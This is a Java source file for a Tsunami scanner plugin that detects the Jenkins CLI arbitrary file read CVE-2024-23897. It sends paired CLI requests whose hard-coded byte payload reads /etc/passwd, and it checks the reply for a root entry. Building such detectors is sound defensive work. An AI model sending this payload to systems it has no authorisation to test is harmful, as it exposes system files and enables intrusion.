/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202423897;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.ACCEPT_ENCODING;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.time.Clock;
import java.time.Instant;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-23897. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202423897VulnDetector",
    version = "1.0",
    description =
        "Jenkins uses the args4j library to parse command arguments and options on the Jenkins"
            + " controller when processing CLI commands. This command parser has a feature that"
            + " replaces an @ character followed by a file path in an argument with the file's"
            + " contents (expandAtFiles). This feature is enabled by default and Jenkins 2.441 and"
            + " earlier, LTS 2.426.2 and earlier does not disable it.This allows attackers to read"
            + " arbitrary files on the Jenkins controller file system using the default character"
            + " encoding of the Jenkins controller process.",
    author = "W0ngL1",
    bootstrapModule = Cve202423897DetectorBootstrapModule.class)
public final class Cve202423897Detector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  @VisibleForTesting static final String VULNERABLE_REQUEST_PATH = "cli?remoting=false";
  static final byte[] PAYLOAD = {
    0x00,
    0x00,
    0x00,
    0x06,
    0x00,
    0x00,
    0x04,
    0x68,
    0x65,
    0x6c,
    0x70,
    0x00,
    0x00,
    0x00,
    0x0e,
    0x00,
    0x00,
    0x0c,
    // @/etc/passwd
    0x40,
    0x2f,
    0x65,
    0x74,
    0x63,
    0x2f,
    0x70,
    0x61,
    0x73,
    0x73,
    0x77,
    0x64,
    0x00,
    0x00,
    0x00,
    0x05,
    0x02,
    0x00,
    0x03,
    // GBK
    0x47,
    0x42,
    0x4b,
    0x00,
    0x00,
    0x00,
    0x07,
    0x01,
    0x00,
    0x05,
    // zh_CN
    0x7a,
    0x68,
    0x5f,
    0x43,
    0x4e,
    0x00,
    0x00,
    0x00,
    0x00,
    0x03
  };
  static final Pattern VULNERABILE_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202423897Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2024-23897 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Boolean result;
    String targetUrl = buildWebApplicationRootUrl(networkService) + VULNERABLE_REQUEST_PATH;
    String uuid = UUID.randomUUID().toString();

    ExecutorService executorService = Executors.newFixedThreadPool(2);
    Future<Boolean> firstRequest =
        executorService.submit(
            () -> {
              try {
                HttpResponse response =
                    httpClient.send(
                        post(targetUrl)
                            .setHeaders(
                                HttpHeaders.builder()
                                    .addHeader("Session", uuid)
                                    .addHeader("Side", "download")
                                    .addHeader(ACCEPT_ENCODING, "identity")
                                    .build())
                            .build(),
                        networkService);
                if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
                  if (VULNERABILE_RESPONSE_PATTERN.matcher(response.bodyString().get()).find()) {
                    return true;
                  }
                }
                return false;
              } catch (Exception e) {
                logger.atWarning().log(
                    "failed to send the first request to target %s.", networkService);
                return false;
              }
            });

    Future<?> secondRequest =
        executorService.submit(
            () -> {
              try {
                Thread.sleep(100);
                HttpResponse response =
                    httpClient.send(
                        post(targetUrl)
                            .setHeaders(
                                HttpHeaders.builder()
                                    .addHeader("Session", uuid)
                                    .addHeader("Side", "upload")
                                    .addHeader(ACCEPT_ENCODING, "identity")
                                    .addHeader(CONTENT_TYPE, "application/octet-stream")
                                    .build())
                            .setRequestBody(ByteString.copyFrom(PAYLOAD))
                            .build(),
                        networkService);
              } catch (Exception e) {
                logger.atWarning().log("failed to send the second request to target for %s.", e);
              }
            });

    try {
      result = firstRequest.get();
    } catch (Exception e) {
      return false;
    }
    executorService.shutdown();

    return result;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_23897"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-23897"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Jenkins Arbitrary File Read")
                .setDescription(
                    "Jenkins uses the args4j library to parse command arguments and options on the"
                        + " Jenkins controller when processing CLI commands. This command parser"
                        + " has a feature that replaces an @ character followed by a file path in"
                        + " an argument with the file's contents (expandAtFiles). This feature is"
                        + " enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and"
                        + " earlier does not disable it. This allows attackers to read arbitrary"
                        + " files on the Jenkins controller file system using the default character"
                        + " encoding of the Jenkins controller process.")
                .setRecommendation("Upgrade to version 2.426.3 or higher"))
        .build();
  }
}
